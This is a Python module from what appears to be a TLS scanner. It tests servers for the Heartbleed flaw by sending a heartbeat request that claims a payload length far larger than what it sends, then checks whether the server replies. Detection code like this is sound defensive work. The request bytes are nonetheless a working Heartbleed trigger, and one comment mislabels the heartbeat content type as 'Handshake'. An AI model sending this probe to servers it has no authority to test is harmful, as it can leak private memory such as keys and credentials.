"""Vulnerability test for Heartbleed"""

from ..VulnerabilityTest import VulnerabilityTest
from ...network.ClientHello import ClientHello
from ...sockets.SafeSocket import SafeSocket


class Heartbleed(VulnerabilityTest):
    name = short_name = "Heartbleed"
    description = "Test for Heartbleed vulnerability"

    def __init__(self, supported_protocols, address, protocol):
        super().__init__(supported_protocols, address, protocol)
        self.valid_protocols = ["TLSv1.2", "TLSv1.1", "TLSv1.0", "SSLv3"]
        self.heartbeat_extension = bytearray([0x00, 0x0F, 0x00, 0x01, 0x01])

    def test(self, version):
        """
        Scan for heartbleed vulnerability

        :param int version: SSL/TLS version
        :return: Whether the server is vulnerable
        :rtype: bool
        """
        # fmt: off
        heartbeat_request = bytes([
            # Record protocol
            0x18,  # Content type (Handshake)
            0x03, version,  # Version
            0x00, 0x03,  # Length
            # Heartbeat
            0x01,  # Type (Request)
            0x40, 0x00,  # Payload length
        ])
        # fmt: on
        client_hello = ClientHello(version)
        client_hello.extensions += self.heartbeat_extension
        client_hello = client_hello.pack_client_hello()

        with SafeSocket(self.address, self.usage) as sock:
            sock.send(client_hello)
            response = sock.receive()
            if not ClientHello.is_server_hello(response):
                return False
            sock.send(heartbeat_request)
            response = sock.receive()
        # Server ignores heartbeat request
        if not response:
            return False
        # Heartbeat content type in record protocol
        elif response[0] == 0x18:
            return True
        return False
